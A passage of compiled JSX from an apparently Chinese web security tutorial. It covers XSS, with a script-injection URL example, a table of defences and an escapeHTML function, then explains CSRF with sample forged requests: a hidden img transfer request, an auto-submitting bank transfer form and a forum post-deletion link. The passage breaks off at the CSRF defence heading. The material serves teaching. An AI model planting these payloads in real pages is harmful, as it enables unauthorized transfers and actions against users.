,l.jsx)(e.span,{children:\"http://example.com/#<script>alert('Hacked!')<\\/script>\"})})})})}),`\n`,(0,l.jsx)(e.p,{children:\"\\u811A\\u672C\\u76F4\\u63A5\\u5728\\u5BA2\\u6237\\u7AEF\\u6267\\u884C\\u3002\"}),`\n`,(0,l.jsx)(e.p,{children:(0,l.jsx)(e.em,{children:\"\\u5C0FTips\\uFF1A\\u6C38\\u8FDC\\u4E0D\\u8981\\u76F8\\u4FE1\\u7528\\u6237\\u8F93\\u5165\\uFF01\\u65E0\\u8BBA\\u662FURL\\u3001\\u8868\\u5355\\u8FD8\\u662F\\u672C\\u5730\\u5B58\\u50A8\\uFF0C\\u90FD\\u8981\\u7ECF\\u8FC7\\u4E25\\u683C\\u6821\\u9A8C\\u548C\\u8F6C\\u4E49\\u3002\"})}),`\n`,(0,l.jsx)(e.h3,{id:\"14-xss\\u9632\\u5FA1\\u6784\\u5EFA\\u575A\\u56FA\\u7684\\u57CE\\u5899-\",children:(0,l.jsx)(e.a,{href:\"#14-xss\\u9632\\u5FA1\\u6784\\u5EFA\\u575A\\u56FA\\u7684\\u57CE\\u5899-\",children:\"1.4 XSS\\u9632\\u5FA1\\uFF1A\\u6784\\u5EFA\\u575A\\u56FA\\u7684\\u57CE\\u5899 \\u{1F3F0}\"})}),`\n`,(0,l.jsxs)(e.p,{children:[\"\\u9632\\u5FA1XSS\\u7684\\u5173\\u952E\\u662F\",(0,l.jsx)(e.strong,{children:\"\\u8F93\\u5165\\u9A8C\\u8BC1\"}),\"\\u3001\",(0,l.jsx)(e.strong,{children:\"\\u8F93\\u51FA\\u8F6C\\u4E49\"}),\"\\u548C\",(0,l.jsx)(e.strong,{children:\"\\u5B89\\u5168\\u7B56\\u7565\"}),\"\\u3002\\u4EE5\\u4E0B\\u662F\\u6700\\u4F73\\u5B9E\\u8DF5\\uFF1A\"]}),`\n`,(0,l.jsxs)(e.table,{children:[(0,l.jsx)(e.thead,{children:(0,l.jsxs)(e.tr,{children:[(0,l.jsx)(e.th,{children:\"\\u9632\\u5FA1\\u63AA\\u65BD\"}),(0,l.jsx)(e.th,{children:\"\\u63CF\\u8FF0\"}),(0,l.jsx)(e.th,{children:\"\\u9002\\u7528\\u573A\\u666F\"})]})}),(0,l.jsxs)(e.tbody,{children:[(0,l.jsxs)(e.tr,{children:[(0,l.jsx)(e.td,{children:\"\\u8F93\\u5165\\u9A8C\\u8BC1\"}),(0,l.jsx)(e.td,{children:\"\\u9650\\u5236\\u8F93\\u5165\\u683C\\u5F0F\\uFF08\\u5982\\u53EA\\u5141\\u8BB8\\u5B57\\u6BCD\\u6570\\u5B57\\uFF09\\uFF0C\\u62D2\\u7EDD\\u53EF\\u7591\\u5185\\u5BB9\"}),(0,l.jsx)(e.td,{children:\"\\u8868\\u5355\\u3001URL\\u53C2\\u6570\"})]}),(0,l.jsxs)(e.tr,{children:[(0,l.jsx)(e.td,{children:\"\\u8F93\\u51FA\\u8F6C\\u4E49\"}),(0,l.jsxs)(e.td,{children:[\"\\u5C06\\u7528\\u6237\\u8F93\\u5165\\u8F6C\\u4E49\\u4E3A\\u5B89\\u5168\\u5B57\\u7B26\\uFF08\\u5982 \",(0,l.jsx)(e.span,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.code,{\"data-language\":\"text\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{children:\"<\"})})})}),\" \\u8F6C\\u4E3A \",(0,l.jsx)(e.span,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.code,{\"data-language\":\"text\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{children:\"&lt;\"})})})}),\"\\uFF09\"]}),(0,l.jsx)(e.td,{children:\"HTML\\u3001\\u5C5E\\u6027\\u3001JavaScript\\u3001CSS\"})]}),(0,l.jsxs)(e.tr,{children:[(0,l.jsx)(e.td,{children:\"\\u4F7F\\u7528\\u5B89\\u5168\\u7684API\"}),(0,l.jsxs)(e.td,{children:[\"\\u4F7F\\u7528 \",(0,l.jsx)(e.span,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.code,{\"data-language\":\"text\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{children:\"textContent\"})})})}),\" \\u800C\\u975E \",(0,l.jsx)(e.span,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.code,{\"data-language\":\"text\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{children:\"innerHTML\"})})})}),\"\\uFF0C\\u907F\\u514D\\u76F4\\u63A5DOM\\u64CD\\u4F5C\"]}),(0,l.jsx)(e.td,{children:\"\\u5355\\u9875\\u5E94\\u7528\\u3001\\u52A8\\u6001\\u6E32\\u67D3\"})]}),(0,l.jsxs)(e.tr,{children:[(0,l.jsx)(e.td,{children:\"Content Security Policy\"}),(0,l.jsxs)(e.td,{children:[\"\\u901A\\u8FC7CSP\\u9650\\u5236\\u811A\\u672C\\u6765\\u6E90\\uFF0C\\u7981\\u7528 \",(0,l.jsx)(e.span,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.code,{\"data-language\":\"text\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{children:\"eval\"})})})}),\" \\u548C\\u5185\\u8054\\u811A\\u672C\"]}),(0,l.jsx)(e.td,{children:\"\\u6240\\u6709Web\\u5E94\\u7528\"})]}),(0,l.jsxs)(e.tr,{children:[(0,l.jsx)(e.td,{children:\"HttpOnly Cookie\"}),(0,l.jsx)(e.td,{children:\"\\u8BBE\\u7F6ECookie\\u4E3AHttpOnly\\uFF0C\\u9632\\u6B62\\u811A\\u672C\\u8BBF\\u95EE\"}),(0,l.jsx)(e.td,{children:\"\\u654F\\u611F\\u6570\\u636E\\u4FDD\\u62A4\"})]})]})]}),`\n`,(0,l.jsx)(e.h4,{id:\"\\u4EE3\\u7801\\u793A\\u4F8B\\u5B89\\u5168\\u7684\\u8F93\\u51FA\\u8F6C\\u4E49\",children:(0,l.jsx)(e.a,{href:\"#\\u4EE3\\u7801\\u793A\\u4F8B\\u5B89\\u5168\\u7684\\u8F93\\u51FA\\u8F6C\\u4E49\",children:\"\\u4EE3\\u7801\\u793A\\u4F8B\\uFF1A\\u5B89\\u5168\\u7684\\u8F93\\u51FA\\u8F6C\\u4E49\"})}),`\n`,(0,l.jsx)(e.figure,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.pre,{tabIndex:\"0\",\"data-language\":\"javascript\",\"data-theme\":\"github-dark\",children:(0,l.jsxs)(e.code,{\"data-language\":\"javascript\",\"data-theme\":\"github-dark\",style:{display:\"grid\"},children:[(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#F97583\"},children:\"function\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" escapeHTML\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"(\"}),(0,l.jsx)(e.span,{style:{color:\"#FFAB70\"},children:\"str\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\") {\"})]}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#F97583\"},children:\"  return\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\" str.\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\"replace\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"(\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:\"/\"}),(0,l.jsx)(e.span,{style:{color:\"#79B8FF\"},children:`[&<>\"']`}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:\"/\"}),(0,l.jsx)(e.span,{style:{color:\"#F97583\"},children:\"g\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\", \"}),(0,l.jsx)(e.span,{style:{color:\"#FFAB70\"},children:\"match\"}),(0,l.jsx)(e.span,{style:{color:\"#F97583\"},children:\" =>\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\" ({\"})]}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:\"    '&'\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\": \"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:\"'&amp;'\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\",\"})]}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:\"    '<'\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\": \"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:\"'&lt;'\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\",\"})]}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:\"    '>'\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\": \"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:\"'&gt;'\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\",\"})]}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:`    '\"'`}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\": \"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:\"'&quot;'\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\",\"})]}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:`    \"'\"`}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\": \"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:\"'&#39;'\"})]}),`\n`,(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"  })[match]);\"})}),`\n`,(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"}\"})}),`\n`,(0,l.jsx)(e.span,{\"data-line\":\"\",children:\" \"}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"document.\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\"getElementById\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"(\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:\"'output'\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\").textContent \"}),(0,l.jsx)(e.span,{style:{color:\"#F97583\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" escapeHTML\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"(userInput);\"})]})]})})}),`\n`,(0,l.jsx)(e.p,{children:(0,l.jsxs)(e.em,{children:[\"\\u5C0FTips\\uFF1A\\u4F7F\\u7528\\u6210\\u719F\\u7684\\u5E93\\u5982 \",(0,l.jsx)(e.span,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.code,{\"data-language\":\"text\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{children:\"DOMPurify\"})})})}),\" \\u8FDB\\u884C\\u8F6C\\u4E49\\uFF0C\\u80FD\\u663E\\u8457\\u964D\\u4F4E\\u51FA\\u9519\\u98CE\\u9669\\u3002\"]})}),`\n`,(0,l.jsx)(e.h3,{id:\"15-xss\\u7684\\u54F2\\u5B66\\u4FE1\\u4EFB\\u4E0E\\u8D23\\u4EFB\",children:(0,l.jsx)(e.a,{href:\"#15-xss\\u7684\\u54F2\\u5B66\\u4FE1\\u4EFB\\u4E0E\\u8D23\\u4EFB\",children:\"1.5 XSS\\u7684\\u54F2\\u5B66\\uFF1A\\u4FE1\\u4EFB\\u4E0E\\u8D23\\u4EFB\"})}),`\n`,(0,l.jsx)(e.p,{children:\"XSS\\u4E0D\\u4EC5\\u662F\\u4E00\\u4E2A\\u6280\\u672F\\u95EE\\u9898\\uFF0C\\u66F4\\u662F\\u4E00\\u4E2A\\u5173\\u4E8E\\u4FE1\\u4EFB\\u4E0E\\u8D23\\u4EFB\\u7684\\u54F2\\u5B66\\u547D\\u9898\\u3002\\u4F5C\\u4E3A\\u5F00\\u53D1\\u8005\\uFF0C\\u6211\\u4EEC\\u9700\\u8981\\u50CF\\u5B88\\u62A4\\u57CE\\u6C60\\u7684\\u5C06\\u519B\\uFF0C\\u65F6\\u523B\\u8B66\\u60D5\\u5916\\u90E8\\u8F93\\u5165\\u7684\\u201C\\u6728\\u9A6C\\u201D\\u3002\\u540C\\u65F6\\uFF0C\\u8BBE\\u8BA1\\u5B89\\u5168\\u7684\\u67B6\\u6784\\u9700\\u8981\\u4ECE\\u5168\\u5C40\\u51FA\\u53D1\\uFF0C\\u8003\\u8651\\u6BCF\\u4E00\\u5C42\\uFF08\\u524D\\u7AEF\\u3001\\u540E\\u7AEF\\u3001\\u6D4F\\u89C8\\u5668\\uFF09\\u7684\\u804C\\u8D23\\u5206\\u914D\\u3002\"}),`\n`,(0,l.jsxs)(e.blockquote,{children:[`\n`,(0,l.jsx)(e.p,{children:\"\\u201C\\u4EE3\\u7801\\u65E0\\u7F6A\\uFF0C\\u4FE1\\u4EFB\\u6709\\u4EF7\\u3002\\u201D \\u2014\\u2014 \\u539F\\u521B\"}),`\n`]}),`\n`,(0,l.jsx)(e.p,{children:\"\\u5728React\\u3001Vue\\u7B49\\u73B0\\u4EE3\\u6846\\u67B6\\u4E2D\\uFF0C\\u81EA\\u52A8\\u8F6C\\u4E49\\uFF08\\u5982React\\u7684JSX\\uFF09\\u964D\\u4F4E\\u4E86XSS\\u98CE\\u9669\\uFF0C\\u4F46\\u4E0D\\u610F\\u5473\\u7740\\u4E07\\u65E0\\u4E00\\u5931\\u3002\\u5F00\\u53D1\\u8005\\u9700\\u4FDD\\u6301\\u201C\\u96F6\\u4FE1\\u4EFB\\u201D\\u5FC3\\u6001\\uFF0C\\u786E\\u4FDD\\u6BCF\\u4E2A\\u73AF\\u8282\\u90FD\\u7ECF\\u8FC7\\u6821\\u9A8C\\u3002\"}),`\n`,(0,l.jsx)(e.h2,{id:\"\\u4E8Ccsrf\\u9690\\u5F62\\u7684\\u4F2A\\u88C5\\u8005-\\uFE0F\\uFE0F\",children:(0,l.jsx)(e.a,{href:\"#\\u4E8Ccsrf\\u9690\\u5F62\\u7684\\u4F2A\\u88C5\\u8005-\\uFE0F\\uFE0F\",children:\"\\u4E8C\\u3001CSRF\\uFF1A\\u9690\\u5F62\\u7684\\u201C\\u4F2A\\u88C5\\u8005\\u201D \\u{1F575}\\uFE0F\\u200D\\u2642\\uFE0F\"})}),`\n`,(0,l.jsx)(e.h3,{id:\"21-csrf\\u662F\\u4EC0\\u4E48\",children:(0,l.jsx)(e.a,{href:\"#21-csrf\\u662F\\u4EC0\\u4E48\",children:\"2.1 CSRF\\u662F\\u4EC0\\u4E48\\uFF1F\"})}),`\n`,(0,l.jsx)(e.p,{children:\"\\u8DE8\\u7AD9\\u8BF7\\u6C42\\u4F2A\\u9020\\uFF08Cross-Site Request Forgery\\uFF0C\\u7B80\\u79F0CSRF\\uFF09\\u662F\\u4E00\\u79CD\\u8BF1\\u5BFC\\u7528\\u6237\\u5728\\u5DF2\\u8BA4\\u8BC1\\u7684\\u7F51\\u7AD9\\u4E0A\\u6267\\u884C\\u975E\\u9884\\u671F\\u64CD\\u4F5C\\u7684\\u653B\\u51FB\\u3002\\u653B\\u51FB\\u8005\\u5229\\u7528\\u6D4F\\u89C8\\u5668\\u7684\\u81EA\\u52A8\\u643A\\u5E26Cookie\\u673A\\u5236\\uFF0C\\u4F2A\\u9020\\u5408\\u6CD5\\u8BF7\\u6C42\\uFF0C\\u6267\\u884C\\u6076\\u610F\\u64CD\\u4F5C\\u3002\"}),`\n`,(0,l.jsx)(e.p,{children:\"\\u7C7B\\u6BD4\\u4E00\\u4E0B\\uFF0CCSRF\\u5C31\\u50CF\\u4E00\\u4E2A\\u201C\\u4F2A\\u88C5\\u8005\\u201D\\uFF1A\\u5B83\\u5192\\u5145\\u4F60\\uFF0C\\u5411\\u94F6\\u884C\\u558A\\u201C\\u8F6C\\u8D26100\\u4E07\\u7ED9\\u6211\\u201D\\uFF0C\\u800C\\u94F6\\u884C\\u56E0\\u4E3A\\u8BA4\\u51FA\\u4E86\\u4F60\\u7684\\u201C\\u8EAB\\u4EFD\\u8BC1\\u201D\\uFF08Cookie\\uFF09\\uFF0C\\u5C31\\u771F\\u7684\\u8F6C\\u4E86\\u94B1\\u3002\\u{1F631}\"}),`\n`,(0,l.jsx)(e.h3,{id:\"22-csrf\\u7684\\u539F\\u7406cookie\\u7684\\u80CC\\u9505\\u4FA0\",children:(0,l.jsx)(e.a,{href:\"#22-csrf\\u7684\\u539F\\u7406cookie\\u7684\\u80CC\\u9505\\u4FA0\",children:\"2.2 CSRF\\u7684\\u539F\\u7406\\uFF1ACookie\\u7684\\u201C\\u80CC\\u9505\\u4FA0\\u201D\"})}),`\n`,(0,l.jsxs)(e.p,{children:[\"CSRF\\u7684\\u6838\\u5FC3\\u5728\\u4E8E\",(0,l.jsx)(e.strong,{children:\"\\u6D4F\\u89C8\\u5668\\u7684Cookie\\u81EA\\u52A8\\u53D1\\u9001\\u673A\\u5236\"}),\"\\u3002\\u5F53\\u7528\\u6237\\u767B\\u5F55\\u7F51\\u7AD9A\\u540E\\uFF0C\\u6D4F\\u89C8\\u5668\\u4F1A\\u81EA\\u52A8\\u4E3A\\u540E\\u7EED\\u8BF7\\u6C42\\u9644\\u5E26Cookie\\u3002\\u653B\\u51FB\\u8005\\u8BF1\\u5BFC\\u7528\\u6237\\u8BBF\\u95EE\\u6076\\u610F\\u7F51\\u7AD9B\\uFF0CB\\u53D1\\u8D77\\u5BF9A\\u7684\\u8BF7\\u6C42\\uFF0C\\u6D4F\\u89C8\\u5668\\u81EA\\u52A8\\u9644\\u5E26A\\u7684Cookie\\uFF0C\\u5BFC\\u81F4\\u8BF7\\u6C42\\u88AB\\u89C6\\u4E3A\\u5408\\u6CD5\\u3002\"]}),`\n`,(0,l.jsx)(e.p,{children:\"\\u4F8B\\u5982\\uFF0C\\u7528\\u6237\\u767B\\u5F55\\u94F6\\u884C\\u7F51\\u7AD9\\u540E\\uFF0C\\u8BBF\\u95EE\\u6076\\u610F\\u9875\\u9762\\uFF1A\"}),`\n`,(0,l.jsx)(e.figure,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.pre,{tabIndex:\"0\",\"data-language\":\"html\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.code,{\"data-language\":\"html\",\"data-theme\":\"github-dark\",style:{display:\"grid\"},children:(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"<\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"img\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" src\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"http://bank.com/transfer?to=evil&amount=1000000\"'}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\">\"})]})})})}),`\n`,(0,l.jsx)(e.p,{children:\"\\u94F6\\u884C\\u670D\\u52A1\\u5668\\u6536\\u5230\\u5E26Cookie\\u7684\\u8BF7\\u6C42\\uFF0C\\u8BEF\\u4EE5\\u4E3A\\u662F\\u7528\\u6237\\u53D1\\u8D77\\uFF0C\\u6267\\u884C\\u8F6C\\u8D26\\u3002\"}),`\n`,(0,l.jsx)(e.p,{children:(0,l.jsx)(e.em,{children:\"\\u5C0FTips\\uFF1ACSRF\\u7684\\u5173\\u952E\\u662F\\u201C\\u4F2A\\u9020\\u8BF7\\u6C42+\\u81EA\\u52A8Cookie\\u201D\\u3002\\u9632\\u5FA1\\u65F6\\u8981\\u6253\\u7834\\u8FD9\\u79CD\\u201C\\u4FE1\\u4EFB\\u94FE\\u201D\\u3002\"})}),`\n`,(0,l.jsx)(e.h3,{id:\"23-csrf\\u653B\\u51FB\\u5B9E\\u4F8B\\u4ECE\\u8F6C\\u8D26\\u5230\\u5220\\u5E16\",children:(0,l.jsx)(e.a,{href:\"#23-csrf\\u653B\\u51FB\\u5B9E\\u4F8B\\u4ECE\\u8F6C\\u8D26\\u5230\\u5220\\u5E16\",children:\"2.3 CSRF\\u653B\\u51FB\\u5B9E\\u4F8B\\uFF1A\\u4ECE\\u8F6C\\u8D26\\u5230\\u5220\\u5E16\"})}),`\n`,(0,l.jsx)(e.h4,{id:\"\\u5B9E\\u4F8B1\\u94F6\\u884C\\u8F6C\\u8D26\",children:(0,l.jsx)(e.a,{href:\"#\\u5B9E\\u4F8B1\\u94F6\\u884C\\u8F6C\\u8D26\",children:\"\\u5B9E\\u4F8B1\\uFF1A\\u94F6\\u884C\\u8F6C\\u8D26\"})}),`\n`,(0,l.jsx)(e.p,{children:\"\\u653B\\u51FB\\u8005\\u53D1\\u9001\\u9493\\u9C7C\\u90AE\\u4EF6\\uFF0C\\u8BF1\\u5BFC\\u7528\\u6237\\u70B9\\u51FB\\uFF1A\"}),`\n`,(0,l.jsx)(e.figure,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.pre,{tabIndex:\"0\",\"data-language\":\"html\",\"data-theme\":\"github-dark\",children:(0,l.jsxs)(e.code,{\"data-language\":\"html\",\"data-theme\":\"github-dark\",style:{display:\"grid\"},children:[(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"<\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"form\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" action\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"http://bank.com/transfer\"'}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" method\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"POST\"'}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\">\"})]}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"  <\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"input\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" type\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"hidden\"'}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" name\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"to\"'}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" value\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"evil\"'}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\" />\"})]}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"  <\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"input\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" type\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"hidden\"'}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" name\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"amount\"'}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" value\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"1000000\"'}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\" />\"})]}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"</\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"form\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\">\"})]}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"<\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"script\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\">document.forms[\"}),(0,l.jsx)(e.span,{style:{color:\"#79B8FF\"},children:\"0\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"].\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\"submit\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"();</\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"script\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\">\"})]})]})})}),`\n`,(0,l.jsx)(e.p,{children:\"\\u7528\\u6237\\u70B9\\u51FB\\u540E\\uFF0C\\u6D4F\\u89C8\\u5668\\u81EA\\u52A8\\u53D1\\u9001POST\\u8BF7\\u6C42\\uFF0C\\u5B8C\\u6210\\u8F6C\\u8D26\\u3002\"}),`\n`,(0,l.jsx)(e.h4,{id:\"\\u5B9E\\u4F8B2\\u8BBA\\u575B\\u5220\\u5E16\",children:(0,l.jsx)(e.a,{href:\"#\\u5B9E\\u4F8B2\\u8BBA\\u575B\\u5220\\u5E16\",children:\"\\u5B9E\\u4F8B2\\uFF1A\\u8BBA\\u575B\\u5220\\u5E16\"})}),`\n`,(0,l.jsx)(e.p,{children:\"\\u653B\\u51FB\\u8005\\u5728\\u8BBA\\u575B\\u5D4C\\u5165\\uFF1A\"}),`\n`,(0,l.jsx)(e.figure,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.pre,{tabIndex:\"0\",\"data-language\":\"html\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.code,{\"data-language\":\"html\",\"data-theme\":\"github-dark\",style:{display:\"grid\"},children:(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"<\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"img\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" src\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"http://forum.com/delete?postId=123\"'}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\">\"})]})})})}),`\n`,(0,l.jsx)(e.p,{children:\"\\u7528\\u6237\\u8BBF\\u95EE\\u9875\\u9762\\u65F6\\uFF0C\\u5E16\\u5B50\\u88AB\\u5220\\u9664\\u3002\"}),`\n`,(0,l.jsx)(e.p,{children:(0,l.jsx)(e.em,{children:\"\\u5C0FTips\\uFF1AGET\\u8BF7\\u6C42\\u5BB9\\u6613\\u88ABCSRF\\u5229\\u7528\\uFF0C\\u654F\\u611F\\u64CD\\u4F5C\\u5C3D\\u91CF\\u7528POST\\u5E76\\u52A0\\u9632\\u62A4\\u3002\"})}),`\n`,(0,l.jsx)(e.h3,{id:\"24-csrf\\u9632\\u5FA1\\u6253\\u7834\\u4F2A\\u88C5\\u7684\\u827A\\u672F-\",children:(0,l.jsx)(e.a,{href:\"#24-csrf\\u9632\\u5FA1\\u6253\\u7834\\u4F2A\\u88C5\\u7684\\u827A\\u672F-\",children:\"2.4 CSRF\\u9632\\u5FA1\\uFF1A\\u6253\\u7834\\u4F2A\\u88C5\\u7684\\u827A\\u672F 